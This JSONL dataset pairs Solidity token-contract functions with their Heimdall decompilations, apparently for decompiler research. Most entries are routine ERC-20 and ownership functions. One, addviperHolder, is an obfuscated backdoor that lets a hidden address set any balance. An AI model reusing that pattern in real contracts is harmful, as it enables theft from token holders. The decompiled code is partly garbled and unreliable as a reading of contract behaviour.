{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function removeLimits() external onlyOwner{\\n        _maxTxAmount = _tTotal;\\n        _maxWalletSize=_tTotal;\\n        transferDelayEnabled=false;\\n        emit MaxTxAmountUpdated(_tTotal);\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x0f4240) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x0f4240;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x0f4240) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x0f4240;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x0f4240) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x0f4240;\n                                emit MaxTxAmountUpdated(0x0f4240);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {\r\n        require(tokenAddress != address(this), \"tokenAddress can not be the native token\");\r\n             if(tokens == 0){\r\n            tokens = ERC20(tokenAddress).balanceOf(address(this));\r\n        }\r\n        emit ClearToken(tokenAddress, tokens);\r\n        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);\r\n    }", "heimdall_decompiled_code": "function clearStuckToken(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0) - address(this));\n        require(0 - arg1);\n        address var_a = address(arg0);\n        uint256 var_b = arg1;\n        emit ClearToken(address(arg0), arg1);\n        var_a = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_c = address(store_n);\n        uint256 var_d = arg1;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_c); // call\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == var_e.length);\n        var_b = var_e.length;\n        return var_e.length;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_c = address(this);\n        (bool success, bytes memory ret0) = address(arg0).balanceOf(var_c); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        var_b = address(arg0);\n        uint256 var_f = var_e.length;\n        emit ClearToken(address(arg0), var_e.length);\n        var_b = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_d = address(store_n);\n        uint256 var_g = var_e.length;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x28;\n        var_g = 0x746f6b656e416464726573732063616e206e6f7420626520746865206e617469;\n        var_h = 0x766520746f6b656e000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xbaAAc69029Fd7edcbcf3222Ec5831aFB9Cd832b8", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0c929e3FF6Ed49E9D538756Bd127f5f23e1fC7D6", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[3312:3349];\n        address var_d = msg.sender;\n        var_e = 0x05;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x05;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_e[var_d] = storage_map_e[var_d] - arg1;\n        address var_f = storage_map_e[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x22;\n        var_k = this.code[3127:3161];\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x24;\n        var_k = this.code[3276:3312];\n    }"}
{"contract_address": "0x3628F9C6c8AAC0c4A085859F247D1828F534D309", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa037974C7653cB0ffdA7332E6E96c0C691eBE1F7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8a357F1146a32d8a2494bCdaB62452ed3498196a", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function updateMarketingWallet(address newWallet) external onlyOwner {\\r\\n        marketingWallet = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        burnEnable = (uint96(burnEnable)) | (0x01000000 * (address(arg0)));\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function setSwapAmount(uint256 _swapAmount) external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        swapAmount = _swapAmount;\r\n    }", "heimdall_decompiled_code": "function setSwapAmount(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_g)));\n        swapAmount = arg0;\n    }"}
{"contract_address": "0x4884709C72961015D2f9e97D123f4a2E480B9014", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function transferManagement(address newManager)\r\n        external\r\n        virtual\r\n        onlyManager\r\n    {\r\n        emit ManagementTransferred(_manager, newManager);\r\n        _manager = newManager;\r\n    }", "heimdall_decompiled_code": "function transferManagement(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(manager)), \"Manageable: caller is not the manager\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x4d616e61676561626c653a2063616c6c6572206973206e6f7420746865206d61;\n        var_e = 0x6e61676572000000000000000000000000000000000000000000000000000000;\n        emit ManagementTransferred(address(manager), address(arg0));\n        manager = (address(arg0)) | (uint96(manager));\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function updateSellFees(\r\n        uint256 _devFee,\r\n        uint256 _liquidityFee,\r\n        uint256 _marketingFee\r\n    ) external onlyOwner {\r\n        sellDevFee = _devFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellMarketingFee = _marketingFee;\r\n        sellTotalFees = sellDevFee + sellLiquidityFee + sellMarketingFee;\r\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        sellDevFee = arg0;\n        sellLiquidityFee = arg1;\n        sellMarketingFee = arg2;\n        require(!arg0 > ~(arg1));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x122B0769A36fBe22EE9FF866fdF7012C9697569e", "original_solidity_code": "function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){\r\n  \t    require(newAmount >= totalSupply() * 1 / 100000, \"Swap amount cannot be lower than 0.001% total supply.\");\r\n  \t    require(newAmount <= totalSupply() * 5 / 1000, \"Swap amount cannot be higher than 0.5% total supply.\");\r\n  \t    swapTokensAtAmount = newAmount;\r\n  \t    return true;\r\n  \t}", "heimdall_decompiled_code": "function updateSwapTokensAtAmount(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(totalSupply & (0x01 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / totalSupply))), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x35;\n        var_e = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_h = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0xE5513c73eaCe54F05fDfa98061784bfd66b86bEA", "original_solidity_code": "function name() external view override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function removeERCToken(address tokenAddress, uint256 tokens) external returns (bool success) {\r\n            if(tokens == 0){\r\n            tokens = ERC20(tokenAddress).balanceOf(address(this));\r\n        }\r\n        emit ClearToken(tokenAddress, tokens);\r\n        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);\r\n    }", "heimdall_decompiled_code": "function removeERCToken(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(0 - arg1);\n        address var_a = address(arg0);\n        uint256 var_b = arg1;\n        emit ClearToken(address(arg0), arg1);\n        var_a = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_c = address(store_r);\n        uint256 var_d = arg1;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_c); // call\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == var_e.length);\n        var_b = var_e.length;\n        return var_e.length;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_c = address(this);\n        (bool success, bytes memory ret0) = address(arg0).balanceOf(var_c); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        var_b = address(arg0);\n        uint256 var_f = var_e.length;\n        emit ClearToken(address(arg0), var_e.length);\n        var_b = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_d = address(store_r);\n        uint256 var_g = var_e.length;\n        (bool success, bytes memory ret0) = address(arg0).many_msg_babbage(var_d); // call\n    }"}
{"contract_address": "0xd549a086975b77F87261Af386f2d6173eDA6a171", "original_solidity_code": "function store(uint256 num) public {\\n        number = num;\\n    }", "heimdall_decompiled_code": "function store(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        retrieve = arg0;\n    }"}
{"contract_address": "0x5Ccbc0cbaFAB8311086076C7B5f245D7fD080981", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xC4215D89Ea7178C76D0FF0cA6363C34b415F8f32", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x6C582560fE845680fA8fFC628a9Ae666008111f4", "original_solidity_code": "function TransferOwnershipForever(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnershipForever(newOwner);\r\n    }", "heimdall_decompiled_code": "function TransferOwnershipForever(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8a24fF8ffc247330F89865e58587858626eB504e", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x328E4802787C25995e524C4280a69F985f08ea48", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x02625a00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x02625a00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x02625a00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x02625a00;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x02625a00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x02625a00;\n                                emit MaxTxAmountUpdated(0x02625a00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function setAdm(address Adm_) public returns (bool) {\r\n \r\n    require(msg.sender == _mod);\r\n \r\n        _adm=Adm_;\r\n \r\n    }", "heimdall_decompiled_code": "function setAdm(address arg0) public returns (bool) {\n        require(address(msg.sender) == (address(_mod / 0x01)));\n        _adm = (address(arg0) * 0x01) | (uint96(_adm));\n        uint256 var_a = 0;\n        return 0;\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x19d4B93c60e5D7995226F47446e56bD6ac2DDD75", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
